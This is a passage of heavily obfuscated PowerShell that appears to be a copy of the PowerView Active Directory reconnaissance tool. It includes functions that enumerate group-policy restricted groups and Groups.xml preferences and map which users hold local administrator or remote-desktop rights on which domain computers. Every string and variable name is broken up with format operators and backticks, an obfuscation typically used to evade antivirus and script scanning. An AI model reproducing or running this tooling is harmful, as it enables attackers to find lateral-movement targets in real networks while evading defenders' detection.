                        ${gR`O`UP`SId} = ("{1}{3}{2}{0}"-f '6','S-1-5-3','-54','2')
                    }
                    else {
                        ${Gr`ou`psiD} = &("{0}{4}{1}{2}{3}" -f'C','rt-N','ameToS','id','onve') -ObjectName ${GROuP`NA`me} | &("{0}{1}{2}" -f'S','el','ect-Object') -ExpandProperty ("{0}{1}" -f 'SI','D')
                    }
                }

                
                ${MEMb`E`Rs} = ${_}."gr`ouP"."pRopEr`TI`Es"."mEm`Be`Rs" | &("{1}{0}{3}{2}" -f 'c','Sele','ject','t-Ob') -ExpandProperty ("{1}{0}"-f 'r','Membe') | &("{0}{1}{2}"-f'Where-Ob','je','ct') { ${_}."A`cTI`oN" -match 'ADD' } | &("{2}{3}{4}{0}{1}"-f '-Obje','ct','Fo','rE','ach') {
                    if(${_}."S`ID") { ${_}."S`iD" }
                    else { ${_}."Na`mE" }
                }

                if (${MeM`BeRS}) {

                    
                    if(${_}."g`ROuP"."F`ILTe`RS") {
                        ${f`IltE`Rs} = ${_}."GRO`UP"."FI`ltE`RS".("{1}{2}{0}{3}"-f 'ume','G','etEn','rator').Invoke() | &("{3}{0}{2}{1}" -f 'a','ct','ch-Obje','ForE') {
                            &("{1}{2}{0}" -f't','New','-Objec') -TypeName ("{0}{1}{2}" -f 'P','SOb','ject') -Property @{("{1}{0}"-f 'e','Typ') = ${_}."l`oCAl`N`AMe";("{0}{1}" -f 'Va','lue') = ${_}."na`Me"}
                        }
                    }
                    else {
                        ${F`IlTeRs} = ${Nu`lL}
                    }

                    if(${M`EMB`Ers} -isnot [System.Array]) { ${m`eMBErS} = @(${M`eMbe`Rs}) }

                    ${gpo`G`RoUp} = &("{2}{0}{1}"-f 'bjec','t','New-O') ("{0}{2}{1}" -f 'P','ject','SOb')
                    ${gPOgrO`UP} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') ("{3}{2}{1}{0}" -f'erty','eprop','ot','N') ("{0}{2}{1}"-f'G','h','POPat') ${tARGEtGRouP`sx`Mlpa`Th}
                    ${G`PO`gro`UP} | &("{0}{2}{1}"-f'Add-M','mber','e') ("{2}{1}{0}" -f'ty','teproper','No') ("{0}{1}"-f'Filt','ers') ${f`i`lTerS}
                    ${G`pogR`O`UP} | &("{1}{3}{0}{2}" -f '-M','Ad','ember','d') ("{0}{2}{1}{3}"-f 'Not','proper','e','ty') ("{2}{0}{1}" -f'upNam','e','Gro') ${gROuP`N`AME}
                    ${Gp`O`GrouP} | &("{1}{2}{0}" -f'ber','Add','-Mem') ("{1}{0}{2}{3}" -f 'tepro','No','pert','y') ("{0}{1}" -f'GroupSI','D') ${GrOuP`s`Id}
                    ${gp`og`ROUp} | &("{0}{2}{1}{3}" -f'A','-M','dd','ember') ("{0}{1}{3}{2}"-f 'N','ot','operty','epr') ("{0}{3}{1}{2}" -f'G','mbe','rOf','roupMe') ${N`ULL}
                    ${g`pOGRo`UP} | &("{2}{0}{1}"-f'-','Member','Add') ("{3}{1}{2}{0}" -f'perty','t','epro','No') ("{2}{3}{0}{1}" -f 'ember','s','G','roupM') ${meMbE`Rs}
                    ${gpoGR`OuP}
                }
            }
        }
        catch {
            
        }
    }

    end {
        if(${Us`ePsdrI`VE} -and ${r`A`NDdRIve}) {
            &("{1}{0}{2}{3}{4}" -f 'e-V','Writ','e','rb','ose') ('Re'+'mov'+'ing '+'temp'+' '+'PSD'+'riv'+'e '+"$RandDrive")
            &("{0}{1}{2}{3}" -f 'Ge','t','-PSD','rive') -Name ${r`AnDDrI`VE} -ErrorAction ("{0}{3}{2}{1}"-f'SilentlyC','inue','t','on') | &("{0}{1}{3}{2}"-f 'Remov','e','Drive','-PS') -Force
        }
    }
}


function gE`T`-Netg`pog`RoUp {


    [CmdletBinding()]
    Param (
        [String]
        ${G`p`ONaMe} = '*',

        [String]
        ${d`Isp`laynamE},

        [String]
        ${do`M`AIn},

        [String]
        ${DOm`AINCONtro`l`LEr},

        [String]
        ${ADs`Pa`Th},

        [Switch]
        ${rEsOl`V`eMeM`BeR`s`IDs},

        [Switch]
        ${U`Sep`SDri`VE},

        [ValidateRange(1,10000)]
        [Int]
        ${PA`ges`IZe} = 200
    )

    ${op`TI`oN} =   ( &("{2}{1}{0}" -f'AblE','Ri','Va')  wxOv  -ValueONly )::"r`eMoVee`mptyeNTri`es"

    ${Gp`OsE`ArCHER} = &("{5}{1}{2}{4}{0}{3}" -f'earch','a','i','er','nS','Get-Dom') -Domain ${DOM`AIn} -DomainController ${D`O`MAIncontrO`Ller} -Credential ${CRED`En`Ti`Al} -ADSpath ${ad`s`pAth} -PageSize ${page`s`IZe}
    ${GpO`s`EaR`ChEr}."fIl`T`eR"=("{1}{2}{4}{11}{3}{14}{12}{5}{0}{8}{9}{6}{10}{13}{7}"-f 'e','(&','(',')(n','objectCategory','=*)(gpcfil','a','))','s','ysp','t','=groupPolicyContainer','e','h=*','am')
    ${gpo`SE`A`RCheR}."p`ROPer`TiEsTo`lOAd".("{0}{2}{1}"-f 'A','dRange','d').Invoke((("{1}{0}{2}{3}" -f'isplayn','d','a','me'), ("{0}{1}"-f'n','ame'), ("{2}{0}{3}{1}"-f 'p','th','g','cfilesyspa')))

    ForEach(${gpOREs`U`lT} in ${gP`oseA`RCHer}.("{1}{0}"-f'ndAll','Fi').Invoke()) {

        ${gPOdisP`lAYn`Ame} = ${gP`O`Re`SULt}."PrOpE`RT`iEs"[("{1}{0}{2}"-f'spl','di','ayname')]
        ${G`pONaMe} = ${G`pore`s`ULT}."PRoper`T`ieS"[("{0}{1}"-f 'nam','e')]
        ${G`po`path} = ${gPo`REsu`lT}."p`R`OPERTiEs"[("{0}{4}{1}{2}{3}" -f 'gpcfi','s','yspa','th','le')]
        &("{1}{3}{0}{2}"-f 'rbo','Write','se','-Ve') ('G'+'et-NetGPOG'+'rou'+'p'+':'+' '+'en'+'umer'+'ati'+'ng '+"$GPOPath")

        ${par`S`eaRgs} =  @{
            ("{0}{3}{2}{1}"-f'Gp','Path','mpl','tT') = ("$GPOPath\MACHINE\Microsoft\Windows "+('NT{0'+'}Se'+'cEdit{'+'0}G'+'pt'+'Tmpl.i'+'nf')  -F [CHAR]92)
            ("{0}{2}{1}" -f'U','ive','sePSDr') = ${U`SE`ps`drive}
        }

        
        ${I`NF} = &("{2}{1}{3}{0}"-f 'Tmpl','Gp','Get-','t') @ParseArgs

        if(${I`Nf} -and (${i`NF}."p`S`BaSE"."k`eys" -contains ("{0}{1}{4}{3}{2}" -f'Gr','ou','p','ershi','p Memb'))) {

            ${mEMB`eRShI`Ps} = @{}

            
            ForEach (${MEM`Be`RS`hIp} in ${I`Nf}.'Group Membership'.("{2}{1}{0}"-f'ator','tEnumer','Ge').Invoke()) {
                ${g`ROUP}, ${Re`LAt`iOn} = ${MEmbE`Rs`hIp}."k`eY".("{0}{1}" -f 'Spl','it').Invoke('__', ${OPt`i`On}) | &("{1}{3}{4}{2}{0}"-f't','F','jec','o','rEach-Ob') {${_}.("{0}{1}"-f'Tr','im').Invoke()}

                
                ${MEMbe`RsHIPv`AL`Ue} = ${mEM`B`ERS`hiP}."v`AlUE" | &("{0}{3}{2}{1}" -f'Where-','ject','b','O') {${_}} | &("{0}{2}{1}" -f'ForEa','ject','ch-Ob') { ${_}.("{0}{1}" -f 'T','rim').Invoke('*') } | &("{2}{1}{3}{0}"-f'ect','r','Whe','e-Obj') {${_}}

                if(${REso`LvEmE`mBEr`sIDS}) {
                    
                    ${gRoUp`M`EmbErs} = @()
                    ForEach(${M`eMbeR} in ${mEmbE`Rshipv`Al`UE}) {
                        if(${Me`M`BeR} -and (${Me`m`BeR}.("{1}{0}" -f 'im','Tr').Invoke() -ne '')) {
                            if(${mE`MBer} -notmatch ("{1}{0}{2}"-f'-','^S-1','.*')) {
                                ${MeM`BeR`SID} = &("{3}{0}{1}{2}"-f 'ame','ToS','id','Convert-N') -Domain ${d`OM`AIN} -ObjectName ${ME`MbeR} | &("{3}{1}{2}{0}" -f 'Object','ct','-','Sele') -ExpandProperty ("{1}{0}"-f 'ID','S')
                                if(${m`EMB`eRsId}) {
                                    ${Gro`U`pmEmb`ERS} += ${m`e`mbE`RsID}
                                }
                                else {
                                    ${g`RoUPmEM`BeRs} += ${mE`Mb`eR}
                                }
                            }
                            else {
                                ${gR`oUp`MEmBERS} += ${m`eMBer}
                            }
                        }
                    }
                    ${mE`mbershIP`Va`lUE} = ${GROup`Me`MBErs}
                }

                if(-not ${m`eM`BeR`shIPs}[${G`RoUP}]) {
                    ${m`EMbe`RSHiPs}[${Gr`o`UP}] = @{}
                }
                if(${MEmB`E`R`SHIP`VALUe} -isnot [System.Array]) {${m`EmB`ErS`hipVaLuE} = @(${m`eMBerSH`ipVal`Ue})}
                ${mEm`B`e`RShiPS}[${gRO`UP}].("{1}{0}" -f 'd','Ad').Invoke(${Re`La`TION}, ${MEMb`E`RSH`IPValue})
            }

            ForEach (${me`M`BerSHiP} in ${M`EMberS`Hi`PS}.("{3}{1}{0}{2}" -f 'm','Enu','erator','Get').Invoke()) {
                if(${ME`MbEr`ShIP} -and ${MeM`BerS`HiP}."K`Ey" -and (${MemB`Ers`h`iP}."K`ey" -match '^\*')) {
                    
                    ${G`Ro`UpsiD} = ${m`EmBE`RsHip}."k`EY".("{1}{0}" -f 'rim','T').Invoke('*')
                    if(${GROUp`S`iD} -and (${grou`PS`id}.("{1}{0}" -f 'im','Tr').Invoke() -ne '')) {
                        ${Gr`O`UpNA`me} = &("{2}{1}{3}{0}" -f 'e','Na','Convert-SidTo','m') -SID ${GRO`UP`SId}
                    }
                    else {
                        ${GroUPn`A`me} = ${f`AL`sE}
                    }
                }
                else {
                    ${g`R`OUPnaMe} = ${memb`ERs`hip}."K`Ey"

                    if(${GrOU`pn`A`ME} -and (${GroU`Pna`me}.("{0}{1}"-f 'Tr','im').Invoke() -ne '')) {
                        if(${grO`UPN`AMe} -match ("{0}{1}{3}{2}"-f'A','dmi','strators','ni')) {
                            ${G`R`ouPSID} = ("{1}{2}{3}{0}" -f'4','S-1-','5-32-5','4')
                        }
                        elseif(${Grou`PNa`me} -match ("{1}{0}{2}" -f 'Desk','Remote ','top')) {
                            ${G`Ro`U`PSId} = ("{3}{2}{1}{0}"-f'555','-','-32','S-1-5')
                        }
                        elseif(${g`RoUPn`A`ME} -match ("{0}{1}" -f 'Gues','ts')) {
                            ${gR`ouPsid} = ("{1}{2}{0}{3}"-f'4','S-1-5','-32-5','6')
                        }
                        elseif(${gr`oUPn`Ame}.("{0}{1}" -f'Tr','im').Invoke() -ne '') {
                            ${grO`UPSiD} = &("{3}{2}{1}{0}"-f 'oSid','ert-NameT','onv','C') -Domain ${d`om`AiN} -ObjectName ${G`RO`UPN`AmE} | &("{3}{2}{1}{0}"-f'ect','bj','lect-O','Se') -ExpandProperty ("{1}{0}"-f'ID','S')
                        }
                        else {
                            ${gR`OupS`id} = ${NU`ll}
                        }
                    }
                }

                ${Gpo`gRoup} = &("{0}{2}{1}"-f'New-O','t','bjec') ("{0}{2}{1}" -f 'PSOb','ct','je')
                ${GpO`G`RouP} | &("{1}{2}{0}"-f'er','Add-Me','mb') ("{1}{0}{2}"-f'eprope','Not','rty') ("{2}{0}{1}{3}"-f'Di','splay','GPO','Name') ${gPOdi`s`Pl`AynaMe}
                ${gpo`Gro`Up} | &("{1}{0}{2}"-f '-Memb','Add','er') ("{3}{2}{0}{1}"-f 'p','roperty','e','Not') ("{1}{2}{0}" -f'me','G','PONa') ${gPON`A`Me}
                ${GP`OGrO`UP} | &("{2}{0}{1}" -f 'b','er','Add-Mem') ("{1}{0}{3}{2}" -f'prop','Note','y','ert') ("{0}{1}{2}" -f 'GP','OPa','th') ${G`p`OpaTH}
                ${gpoG`RO`Up} | &("{1}{2}{3}{0}"-f'r','Add-','Mem','be') ("{0}{1}{2}" -f 'N','oteprope','rty') ("{1}{0}"-f 'e','GPOTyp') ("{1}{2}{3}{0}"-f'edGroups','R','es','trict')
                ${GPogR`OuP} | &("{1}{2}{0}{3}"-f 'Mem','Ad','d-','ber') ("{0}{3}{2}{1}"-f'No','rty','rope','tep') ("{1}{0}"-f'ers','Filt') ${Nu`Ll}
                ${gP`o`Gro`Up} | &("{2}{1}{0}" -f 'r','dd-Membe','A') ("{3}{2}{1}{0}"-f'y','opert','r','Notep') ("{1}{2}{0}" -f 'Name','G','roup') ${GR`OUpn`Ame}
                ${GPOg`ROUp} | &("{1}{2}{0}" -f'mber','Add-M','e') ("{1}{2}{0}" -f'eproperty','No','t') ("{0}{1}{2}" -f 'Gro','u','pSID') ${G`R`oUpsId}
                ${g`POGRoup} | &("{3}{0}{1}{2}" -f 'e','mbe','r','Add-M') ("{3}{2}{0}{1}"-f'r','ty','ope','Notepr') ("{2}{1}{0}{3}"-f'O','er','GroupMemb','f') ${me`mB`ERS`Hip}."vAl`UE"."M`eMb`ERoF"
                ${Gpog`R`OuP} | &("{1}{2}{3}{0}" -f'r','Add-M','em','be') ("{1}{2}{0}"-f 'operty','No','tepr') ("{1}{0}{2}{3}" -f 'upMe','Gro','mbe','rs') ${M`eMbERs`Hip}."v`AlUE"."me`MBers"
                ${gpO`grO`Up}
            }
        }

        ${p`Ar`SeAR`gS} =  @{
            ("{0}{2}{3}{1}" -f'GroupsX','th','M','Lpa') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            ("{1}{0}{2}"-f 'PSD','Use','rive') = ${U`Se`psDr`IVe}
        }

        &("{2}{1}{0}" -f'oupsXML','r','Get-G') @ParseArgs | &("{1}{0}{2}"-f'jec','ForEach-Ob','t') {
            if(${r`eSOLve`mEM`B`ErSIDS}) {
                ${GRou`PMemB`Ers} = @()
                ForEach(${Me`mbEr} in ${_}."gR`oUP`memBERS") {
                    if(${m`E`mbEr} -and (${Me`mb`Er}.("{1}{0}" -f'rim','T').Invoke() -ne '')) {
                        if(${Me`mBEr} -notmatch ("{0}{1}" -f '^S-1-.','*')) {
                            
                            ${MEMb`Er`SId} = &("{1}{0}{3}{2}{4}" -f'onvert-N','C','To','ame','Sid') -Domain ${DOm`Ain} -ObjectName ${Me`m`BEr} | &("{3}{2}{0}{1}"-f'c','t','elect-Obje','S') -ExpandProperty ("{1}{0}" -f 'D','SI')
                            if(${mE`mBER`sid}) {
                                ${Gro`UPm`e`mB`erS} += ${M`E`mB`ersid}
                            }
                            else {
                                ${grO`Upme`M`BErs} += ${mEM`B`eR}
                            }
                        }
                        else {
                            ${gRo`U`PMembE`Rs} += ${memb`ER}
                        }
                    }
                }
                ${_}."gROUPmem`Be`Rs" = ${GROU`PMe`MbeRS}
            }

            ${_} | &("{0}{3}{1}{2}"-f'Add-','e','r','Memb') ("{0}{2}{1}{3}" -f'No','eprope','t','rty') ("{3}{1}{4}{2}{0}" -f'ame','i','yN','GPOD','spla') ${GP`Od`i`S`PLAYnAme}
            ${_} | &("{0}{2}{1}"-f'Add-Me','er','mb') ("{0}{2}{1}" -f 'N','y','otepropert') ("{1}{0}{2}" -f'Na','GPO','me') ${Gp`ONa`ME}
            ${_} | &("{0}{2}{1}" -f'Add','ember','-M') ("{0}{1}{3}{2}" -f 'Notep','rop','rty','e') ("{2}{0}{1}" -f'Typ','e','GPO') ("{2}{1}{0}{3}"-f'ce','cyPreferen','GroupPoli','s')
            ${_}
        }
    }
}


function F`inD-GPOlOca`T`I`on {


    [CmdletBinding()]
    Param (
        [String]
        ${DOmA`iN},

        [String]
        ${dOmAi`Nc`OntR`o`llEr},

        [String]
        ${lO`C`ALGRo`Up} = ("{3}{2}{0}{4}{1}" -f 'inistr','tors','dm','A','a'),

        [Switch]
        ${Us`epS`Drive},

        [ValidateRange(1,10000)]
        [Int]
        ${paGE`SI`zE} = 200
    )

    ${t`ArG`Et`SiDs} = @('*')

    
    if(${locA`l`gRo`UP} -like ("{1}{0}" -f'in*','*Adm')) {
        ${TaRg`eT`loCAlsiD} = ("{1}{3}{0}{2}"-f '-5','S-1','44','-5-32')
    }
    elseif ( (${lOcAL`gr`O`UP} -like ("{1}{0}"-f'DP*','*R')) -or (${lOCal`Gro`Up} -like ("{1}{0}{2}" -f 'ot','*Rem','e*')) ) {
        ${tArGeTL`o`C`ALSid} = ("{0}{2}{1}{3}" -f 'S-1','-32','-5','-555')
    }
    elseif (${LoCALgr`o`UP} -like ("{0}{1}{2}" -f 'S','-1','-5-*')) {
        ${t`ARGeTlO`CA`Ls`ID} = ${L`OCALG`ROup}
    }
    else {
        throw ((("{6}{4}{2}{16}{10}{18}{8}{21}{7}{11}{3}{14}{24}{0}{15}{1}{5}{17}{19}{22}{23}{9}{13}{20}{12}" -f'QV, p','PpQ',' ','r','roup','V, or a p','LocalG','str','Admi','S','e p','ato','ormat.','ID ','s','QVRD','must b','Q','QV','VS-1-5-','f','ni','Xp','QV ','p'))."rE`place"(([ChAR]112+[ChAR]81+[ChAR]86),[StRiNG][ChAR]39))
    }

    if(-not ${Ta`R`getSIds}) {
        throw ("{2}{3}{1}{4}{0}" -f 'SIDs!','ecti','No',' eff','ve target ')
    }

    &("{0}{3}{2}{1}" -f'Wr','se','erbo','ite-V') ('Tar'+'ge'+'tL'+'oca'+'lSID: '+"$TargetLocalSID")
    &("{1}{0}{3}{2}"-f '-V','Write','ose','erb') ('E'+'ffective'+' '+'tar'+'g'+'et '+'S'+'IDs: '+"$TargetSIDs")

    ${gPo`Gr`OUpARgs} =  @{
        ("{1}{0}{2}"-f 'oma','D','in') = ${dO`maIN}
        ("{0}{5}{4}{1}{3}{2}" -f'Dom','nt','r','rolle','nCo','ai') = ${D`O`mAiNCONTRO`LLEr}
        ("{1}{0}{2}{3}" -f 'D','UsePS','riv','e') = ${UsE`PSd`R`IvE}
        ("{0}{4}{2}{1}{3}{5}"-f'Re','veMember','ol','S','s','IDs') = ${TR`Ue}
        ("{0}{2}{1}"-f'P','e','ageSiz') = ${p`AGesI`Ze}
    }

    
    &("{2}{0}{1}"-f '-O','bject','Sort') -Property ("{0}{1}" -f 'GP','OName') -Unique -InputObject $(ForEach(${GPO`gRO`Up} in (&("{1}{2}{0}"-f 'p','Get-Ne','tGPOGrou') @GPOGroupArgs)) {
        
        
        if(${gP`Og`Roup}."g`R`oupsid" -match ${TaRGE`TlO`CAl`siD}) {
            ForEach(${gPo`grO`UpMeMbER} in ${g`PO`gr`OUp}."GroUPme`m`B`eRs") {
                if(${GP`ogRou`p`MeMbER}) {
                    if ( (${TaRG`E`TsIDs}[0] -eq '*') -or (${TarGe`TS`IDs} -Contains ${gPOgRo`U`Pm`EmbER}) ) {
                        ${gp`OGRO`UP}
                    }
                }
            }
        }
        
        if( (${GpOG`RO`Up}."GrOUpmeMB`er`OF" -contains ${Tar`G`ETlOCAls`id}) ) {
            if( (${tARG`eT`SIDs}[0] -eq '*') -or (${tAR`getS`ids} -Contains ${GpoGr`oUP}."gro`U`psid") ) {
                ${g`poGroUp}
            }
        }
    }) | &("{3}{0}{1}{2}{4}"-f'ac','h-','Ob','ForE','ject') {

        ${gp`oName} = ${_}."g`PodisPLa`Yn`AME"
        &("{0}{3}{1}{2}" -f'w','te-ver','bose','ri') ('GPOn'+'am'+'e: '+"$GPOname")
        ${G`p`OGuid} = ${_}."GpoN`AmE"
        ${gPo`P`ATH} = ${_}."G`popaTh"
        ${GP`O`TYpe} = ${_}."gpO`Ty`PE"
        if(${_}."G`ROuPmE`m`BErS") {
            ${GpOMeM`B`eRs} = ${_}."g`RO`U`pmeMBeRs"
        }
        else {
            ${GP`O`MembeRS} = ${_}."gROupS`ID"
        }

        ${fi`lTE`Rs} = ${_}."f`I`lTErS"

        if(-not ${T`AR`g`eToBJECt}) {
            
            
            ${TArGeto`BjeCT`S`I`DS} = ${GpoM`Em`Bers}
        }
        else {
            ${taRG`eto`B`jEcT`sIds} = ${tARgeT`o`Bj`ECT}
        }

        
        &("{1}{2}{0}"-f'OU','Get-N','et') -Domain ${DO`mAIn} -DomainController ${dOmAInco`N`TroL`leR} -GUID ${gPoG`U`iD} -FullData -PageSize ${PAg`e`siZe} | &("{2}{3}{0}{4}{1}"-f'j','ct','ForEa','ch-Ob','e') {
            if(${FilT`Ers}) {
                
                
                ${FiLte`Rv`Al`Ue} = ${FIlt`E`RS}."v`AlUE"
                ${o`UcOMp`UT`eRs} = ForEach(${OuCO`M`Pu`TeR} in (&("{1}{2}{0}{3}"-f 'etComput','G','et-N','er') -Domain ${doM`AIn} -DomainController ${dO`m`AInc`onTRoLlEr} -Credential ${CRE`den`T`IAl} -ADSpath ${_}."adSP`Ath" -PageSize ${PAGeSI`ze})) {
                    if(${oucO`mpU`T`eR}.("{1}{0}"-f'ower','ToL').Invoke() -match ${FIlTe`Rs}."Va`lUE") {
                        ${oU`Com`puTEr}
                    }
                }
            }
            else {
                ${ouCOMPUt`e`RS} = &("{3}{1}{4}{0}{2}"-f'mpute','C','r','Get-Net','o') -Domain ${DOMA`In} -DomainController ${DOmaInC`O`NT`R`OLLER} -Credential ${CREDE`NT`I`Al} -ADSpath ${_}."ad`s`pATh" -PageSize ${pAgEs`i`ZE}
            }

            if(${o`UCOMpu`T`eRs}) {
                if(${O`UCoMp`UtE`Rs} -isnot [System.Array]) {${OuCom`p`UTE`RS} = @(${O`U`COM`pUtERs})}
                ForEach (${Tar`gEtS`id} in ${targetOBJ`e`c`TSiDs}) {
                    ${O`BJeCT} = &("{2}{3}{1}{0}" -f 'ect','ADObj','Ge','t-') -SID ${T`ARG`eT`sid}
                    if (-not ${o`BJe`CT}) {
                        ${obj`e`ct} = &("{1}{0}{2}{3}"-f'b','Get-ADO','jec','t') -SID ${TA`RGEt`SiD} -Domain ${DOMA`IN} -DomainController ${Doma`inC`OnT`ROlLer} -Credential ${C`R`EDe`Ntial} -PageSize ${Pa`ges`iZe}
                    }
                    if(${oB`J`ECt}) {
                        ${MEM`B`erDn} = ${ob`J`ecT}."dIS`TiN`g`UisHEdNa`me"
                        ${oB`JeC`TDOM`AiN} = ${Membe`R`DN}.("{0}{2}{1}"-f 'sub','ng','Stri').Invoke(${M`eMB`eR`DN}.("{2}{1}{0}" -f 'f','ndexO','I').Invoke("DC=")) -replace 'DC=','' -replace ',','.'
                        ${i`Sg`ROuP} = @(("{1}{0}{2}"-f'8435','26','456'),("{1}{2}{0}"-f'457','2','68435'),("{0}{1}"-f'53687','0912'),("{0}{2}{1}"-f '53687','3','091')) -contains ${OB`JECT}."S`AMA`CC`O`UnttypE"

                        ${gp`oLoc`ATion} = &("{2}{0}{3}{1}" -f 'Obje','t','New-','c') ("{0}{1}"-f'PSObj','ect')
                        ${gpoLOc`AtI`on} | &("{1}{0}{2}" -f 'dd-M','A','ember') ("{2}{1}{0}{3}"-f 'pr','ote','N','operty') ("{2}{1}{0}{3}"-f'ect','j','Ob','Domain') ${ObJEc`TD`oM`AIN}
                        ${g`p`OLO`caTIon} | &("{0}{1}{2}" -f'Add','-Mem','ber') ("{3}{1}{2}{0}" -f'ty','epr','oper','Not') ("{2}{0}{1}" -f 'bjectN','ame','O') ${O`Bj`ect}."sAmA`CC`ou`NT`NAME"
                        ${GpolOCA`T`IOn} | &("{2}{0}{1}"-f'b','er','Add-Mem') ("{1}{2}{0}" -f'operty','Notep','r') ("{1}{2}{0}" -f 'DN','Ob','ject') ${Ob`J`Ect}."DiS`TinGui`ShE`DNA`Me"
                        ${gPoloca`T`I`oN} | &("{1}{3}{2}{0}"-f 'ember','A','-M','dd') ("{0}{3}{1}{2}" -f 'Note','t','y','proper') ("{0}{1}{2}" -f'Obje','ct','SID') ${obJE`cT}."obJ`E`CtSiD"
                        ${gP`oLocA`T`IOn} | &("{0}{1}{2}" -f'A','dd-Me','mber') ("{2}{0}{3}{1}"-f'p','ty','Note','roper') ("{1}{2}{0}" -f'up','I','sGro') ${isg`RO`UP}
                        ${g`Po`LOc`AtIon} | &("{3}{1}{0}{2}" -f'be','em','r','Add-M') ("{1}{0}{2}"-f 'epro','Not','perty') ("{0}{1}{2}"-f'GPOD','omai','n') ${D`O`mAin}
                        ${gpO`Loc`A`TioN} | &("{2}{1}{0}" -f'r','d-Membe','Ad') ("{1}{3}{0}{2}"-f 't','Note','y','proper') ("{4}{2}{3}{0}{1}"-f 'la','yName','i','sp','GPOD') ${G`Po`NAme}
                        ${gPoLo`Cati`oN} | &("{2}{0}{1}" -f '-Mem','ber','Add') ("{3}{1}{0}{2}" -f 'r','pe','ty','Notepro') ("{0}{1}" -f'GPO','Guid') ${G`pOguId}
                        ${G`POL`o`CAtIoN} | &("{2}{1}{0}" -f 'er','Memb','Add-') ("{3}{2}{0}{1}" -f 'p','erty','o','Notepr') ("{1}{0}{2}"-f'OPa','GP','th') ${gPoP`ATH}
                        ${gpO`Loc`At`ION} | &("{0}{2}{1}"-f'Add-Mem','r','be') ("{2}{0}{1}"-f 'tepropert','y','No') ("{0}{1}" -f'GPOTyp','e') ${g`POT`YPe}
                        ${gp`o`lOc`AtIon} | &("{0}{1}{2}" -f'A','dd-','Member') ("{3}{1}{2}{0}" -f 'rty','p','rope','Note') ("{1}{0}{3}{2}" -f 'tainerNa','Con','e','m') ${_}."DIS`T`i`NGUisHEdn`AME"
                        ${GpolO`CAt`iON} | &("{2}{0}{3}{1}" -f'dd-Mem','r','A','be') ("{3}{2}{0}{1}" -f 'teproper','ty','o','N') ("{2}{1}{0}"-f'me','uterNa','Comp') ${OUC`o`mpute`RS}
                        ${GpOl`O`catI`on}."p`SO`Bject"."t`ypenA`mES".("{0}{1}" -f'Ad','d').Invoke(("{5}{4}{1}{2}{0}{3}"-f 'ocalGrou','rView.','GPOL','p','owe','P'))
                        ${g`po`LOc`ATiOn}
                    }
                }
            }
        }

        
        &("{0}{1}{2}" -f'Get-N','e','tSite') -Domain ${d`o`Main} -DomainController ${DOMai`Nc`oN`TR`OLleR} -GUID ${G`poGuId} -PageSize ${p`A`gesiZE} -FullData | &("{0}{3}{1}{2}" -f 'F','je','ct','orEach-Ob') {

            ForEach (${Tar`Ge`TSid} in ${T`ARgETo`BJECt`S`Ids}) {
                
                ${o`BJE`CT} = &("{3}{1}{0}{2}"-f't-A','e','DObject','G') -SID ${TA`RgE`TSid}
                if (-not ${O`BJ`Ect}) {
                    ${OB`J`ECt} = &("{1}{0}{2}"-f't-ADO','Ge','bject') -SID ${t`ARgeTs`id} -Domain ${doMa`IN} -DomainController ${d`oM`AIN`C`OnTROl`LeR} -Credential ${cRe`DE`NtIAl} -PageSize ${PAG`E`SizE}                        
                }
                if(${oB`jeCT}) {
                    ${mEM`Ber`dN} = ${Ob`JECT}."di`s`TinguisHed`NAMe"
                    ${oB`JE`cTDOmAIN} = ${MeM`BE`R`dN}.("{1}{0}" -f'ng','subStri').Invoke(${MEM`Be`RDn}.("{2}{0}{1}" -f'nde','xOf','I').Invoke("DC=")) -replace 'DC=','' -replace ',','.'
                    ${ISg`R`oUp} = @(("{1}{0}{2}"-f'84','26','35456'),("{2}{0}{1}"-f'43545','7','268'),("{2}{0}{1}"-f '68','70912','53'),("{2}{1}{0}"-f'3','1','5368709')) -contains ${Obj`E`Ct}."saMACCOuNt`T`YpE"

                    ${AP`PL`ieds`ItE} = &("{2}{1}{0}"-f 'ject','w-Ob','Ne') ("{0}{2}{1}"-f'PSObj','ct','e')
                    ${gP`OlOCAT`iON} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') ("{1}{0}{2}{3}" -f'otep','N','roper','ty') ("{2}{3}{1}{0}"-f 'in','oma','Objec','tD') ${O`B`jEC`Tdo`maIn}
                    ${AP`p`LieDSITE} | &("{2}{1}{3}{0}"-f 'er','dd-','A','Memb') ("{1}{0}{3}{2}" -f 'epr','Not','y','opert') ("{1}{2}{0}" -f 'me','Object','Na') ${OB`jecT}."samAcc`Ou`NTNaMe"
                    ${APPl`Ie`Ds`ITe} | &("{0}{2}{1}{3}" -f'Add','Mem','-','ber') ("{1}{0}{2}"-f'roper','Notep','ty') ("{0}{2}{1}" -f 'Obje','N','ctD') ${O`BJEcT}."disTiNgUI`ShEDn`A`me"
                    ${apPL`iEDs`I`Te} | &("{0}{1}{2}" -f 'Add-Memb','e','r') ("{2}{0}{3}{1}"-f 'tep','ty','No','roper') ("{2}{3}{0}{1}" -f 'I','D','O','bjectS') ${OB`jE`Ct}."OBJE`C`TSId"
                    ${a`pPL`iEdS`ITe} | &("{1}{2}{0}" -f 'mber','Add-M','e') ("{3}{1}{2}{0}" -f 'ty','eprop','er','Not') ("{0}{1}{2}"-f 'Is','Grou','p') ${IS`gR`oUP}
                    ${APpliEDs`I`Te} | &("{1}{0}{2}" -f 'mb','Add-Me','er') ("{1}{2}{0}" -f'perty','N','otepro') ("{0}{1}" -f'G','PODomain') ${D`Omain}
                    ${AP`Pl`Ie`dsIte} | &("{2}{0}{1}"-f 'd-M','ember','Ad') ("{1}{2}{0}" -f 'eproperty','No','t') ("{2}{3}{0}{1}"-f'ayNa','me','GPODis','pl') ${gPo`N`AMe}
                    ${APPlI`E`DS`ite} | &("{0}{2}{1}" -f'Ad','mber','d-Me') ("{2}{3}{0}{1}" -f'er','ty','Note','prop') ("{1}{0}"-f'Guid','GPO') ${G`Pogu`iD}
                    ${aPP`li`eDSite} | &("{0}{1}{2}"-f'Add-Me','mb','er') ("{0}{2}{1}"-f'Not','operty','epr') ("{1}{2}{0}"-f 'Path','G','PO') ${Gp`op`AtH}
                    ${ap`pLie`DS`itE} | &("{0}{1}{2}"-f 'A','dd-Membe','r') ("{1}{2}{3}{0}"-f 'operty','N','ote','pr') ("{0}{2}{1}" -f'G','e','POTyp') ${GP`OT`Ype}
